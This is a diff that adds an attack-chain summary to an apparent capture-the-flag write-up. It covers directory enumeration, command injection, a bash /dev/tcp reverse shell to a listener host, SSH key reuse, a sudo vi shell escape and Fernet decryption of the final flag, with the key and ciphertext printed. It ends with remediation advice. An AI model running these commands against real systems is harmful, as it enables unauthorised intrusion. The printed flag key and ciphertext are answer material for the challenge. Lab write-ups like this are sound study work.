@@ -84,7 +84,81 @@ Exploit sudo misconfiguration for privilege escalation
 
 Obtain root flag (root.txt)
 
-Complete comprehensive attack documentation
+FINAL 
+Attack Chain Summary
+Phase 1: Initial Access
+Technique: Web Directory Enumeration
 
-Interim Conclusions
+Command:
+
+bash
+gobuster dir -u http://10.201.122.107/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html
+Finding: Discovered /home.php with command injection capability
+
+Phase 2: Reverse Shell Establishment
+Technique: Remote Code Execution via Command Injection
+
+Local Listener:
+
+bash
+nc -nvlp 1234
+Payload Executed:
+
+text
+bash -c 'exec bash -i &>/dev/tcp/10.201.30.228/1234 <&1'
+Phase 3: Lateral Movement
+Technique: SSH Private Key Compromise
+
+Key Location: /home/charlie/teleport
+
+Transfer Method: Base64 encoding/decoding
+
+SSH Access:
+
+bash
+chmod 600 teleport
+ssh -i teleport charlie@10.201.122.107
+Phase 4: Privilege Escalation
+Technique: Sudo Misconfiguration Abuse
+
+Vulnerable Command: vi with sudo privileges
+
+Exploitation:
+
+bash
+sudo vi -c ':!/bin/sh' /dev/null
+Phase 5: Final Flag Extraction
+Method: Cryptographic Decryption
+
+Key: -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+
+Encrypted Data: gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ
+
+Decryption Command:
+
+python
+from cryptography.fernet import Fernet
+f = Fernet(key)
+print(f.decrypt(encrypted_mess).decode())
+Critical Vulnerabilities Identified
+Unauthenticated RCE via web command injection
+
+Plaintext credential storage in web-accessible files
+
+SSH private key exposure with inadequate protection
+
+Sudo misconfiguration allowing privilege escalation
+
+Insecure cryptographic implementation with hardcoded keys
+
+Security Recommendations
+Implement input validation and sanitization for web applications
+
+Remove unnecessary sudo privileges for service accounts
+
+Store sensitive credentials using secure secret management
+
+Conduct regular security assessments and penetration testing
+
+Implement network segmentation and access controls
 The assessment successfully identified and exploited a critical remote code execution vulnerability in the web application. Unauthorized access was achieved through command injection, leading to the compromise of sensitive authentication credentials and cryptographic material. The obtained SSH private key provides a persistent access mechanism to the target environment.
